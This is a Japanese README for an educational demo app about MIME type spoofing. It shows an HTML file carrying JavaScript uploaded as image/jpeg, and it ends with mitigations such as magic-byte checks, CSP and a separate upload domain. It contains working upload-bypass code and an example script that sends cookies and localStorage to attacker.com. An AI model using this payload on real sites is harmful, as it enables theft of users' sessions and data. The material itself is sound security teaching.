# MIME Type Spoofing デモアプリケーション

このプロジェクトは、ファイルアップロード時のContent-Typeのみの検証による攻撃の危険性を学習するためのデモアプリケーションです。

## 🎯 デモの内容

画像アップロード機能において、サーバーがContent-Typeのみで検証することで、HTMLファイル（JavaScript埋め込み）をContent-Type: image/jpegでアップロードし、被害者がダウンロードして開くとJavaScriptが実行される攻撃を示します。

## 🚀 起動方法

```bash
npm install
npm run dev
```

ブラウザで [http://localhost:3000](http://localhost:3000) を開きます。

## 📝 デモ手順

### 方法1: 攻撃ページを使用

1. アプリケーションを起動
2. ブラウザで `attack.html` を開く
3. 「🚀 攻撃を実行」ボタンをクリック
4. Content-Typeをimage/jpegに偽装したHTMLファイルがアップロードされる
5. 表示されたURLをクリック
6. アラートが表示され、JavaScriptが実行されたことを確認

### 方法2: 手動アップロード

1. アプリケーションを起動
2. ブラウザで [http://localhost:3000](http://localhost:3000) を開く
3. 開発者ツールを開き、Consoleで以下を実行：

```javascript
const html = '<!DOCTYPE html><html><body><h1>🚨 XSS</h1><script>alert("Attack!")</script></body></html>';
const blob = new Blob([html], { type: 'image/jpeg' });
const file = new File([blob], 'attack.jpg', { type: 'image/jpeg' });
const formData = new FormData();
formData.append('file', file);
fetch('/api/upload', { method: 'POST', body: formData }).then(r => r.json()).then(console.log);
```

4. アップロードされたURLを開くとJavaScriptが実行される

## ⚠️ 脆弱性のポイント

### 問題点
- **Content-Typeのみで判断**: サーバー側がContent-Typeヘッダーのみをチェック
- **Content-Typeは偽装可能**: クライアント側で自由に設定できる
- **ファイル内容未検証**: マジックバイト（ファイルシグネチャ）を確認していない
- **HTMLのスクリプト実行**: HTMLファイル内のJavaScriptが実行される

### 攻撃の流れ
1. フロントエンドで拡張子チェック (.jpg, .png)
2. サーバーでContent-Typeチェック (image/jpeg, image/png)
3. 攻撃者がHTMLファイル（JavaScript埋め込み）を作成
4. Content-Typeをimage/jpegに偽装してアップロード
5. HTMLファイルが画像として保存される
6. 被害者がファイルをダウンロードして開く
7. ブラウザがHTMLとして解釈し、JavaScriptが実行される
8. Cookie、LocalStorageなどの情報が盗まれる可能性

## 🛡️ 対策方法

### 1. ファイル内容の検証（マジックバイト）
```typescript
const buffer = Buffer.from(await file.arrayBuffer());

// JPEG: FF D8 FF
const isJPEG = buffer[0] === 0xFF && buffer[1] === 0xD8 && buffer[2] === 0xFF;

// PNG: 89 50 4E 47
const isPNG = buffer[0] === 0x89 && buffer[1] === 0x50 && 
              buffer[2] === 0x4E && buffer[3] === 0x47;

// SVG: 3C 73 76 67 または 3C 3F 78 6D 6C
const isSVG = buffer.toString('utf8', 0, 4) === '<svg' || 
              buffer.toString('utf8', 0, 5) === '<?xml';

if (!isJPEG && !isPNG) {
  return NextResponse.json({ error: '無効な画像ファイル' }, { status: 400 });
}
```

### 2. SVGファイルのサニタイゼーション
```typescript
// SVGを許可する場合は、scriptタグを除去
import { sanitize } from 'dompurify';

if (isSVG) {
  const svgContent = buffer.toString('utf8');
  const sanitized = sanitize(svgContent, { 
    USE_PROFILES: { svg: true },
    FORBID_TAGS: ['script']
  });
}
```

### 3. Content Security Policy (CSP)
```typescript
// layout.tsx
<meta 
  httpEquiv="Content-Security-Policy" 
  content="script-src 'self'; object-src 'none';" 
/>
```

### 4. 別ドメインでの配信
```typescript
// ユーザーアップロードファイルは別ドメインで配信
// 例: uploads.example.com
// メインドメインのCookieにアクセスできなくなる
```

### 5. ファイル名のランダム化
```typescript
import crypto from 'crypto';

const safeFileName = `${crypto.randomUUID()}${ext}`;
```

## 📚 学習ポイント

- **拡張子は信頼できない**: ファイル名は簡単に偽装可能
- **Content-Typeも偽装可能**: HTTPヘッダーは攻撃者が制御できる
- **マジックバイトで検証**: ファイルの実際の内容を確認する必要がある
- **SVGは危険**: SVGファイル内にJavaScriptを埋め込める
- **適切なヘッダー設定**: X-Content-Type-Options: nosniff が重要
- **CSPの活用**: Content Security Policyでスクリプト実行を制限

## 🔍 実際の攻撃例

```javascript
// 攻撃者のコード
const maliciousHTML = `<!DOCTYPE html>
<html>
<body>
  <script>
    // Cookie、LocalStorageを盗む
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookie: document.cookie,
        localStorage: Object.keys(localStorage).reduce((obj, key) => {
          obj[key] = localStorage.getItem(key);
          return obj;
        }, {}),
        url: location.href
      })
    });
  </script>
</body>
</html>`;

// Content-Typeをimage/jpegに偽装
const blob = new Blob([maliciousHTML], { type: 'image/jpeg' });
const file = new File([blob], 'image.jpg', { type: 'image/jpeg' });

// アップロード
const formData = new FormData();
formData.append('file', file);
await fetch('/api/upload', { method: 'POST', body: formData });
```

## ⚠️ 注意事項

このアプリケーションは教育目的のデモです。本番環境では絶対に使用しないでください。
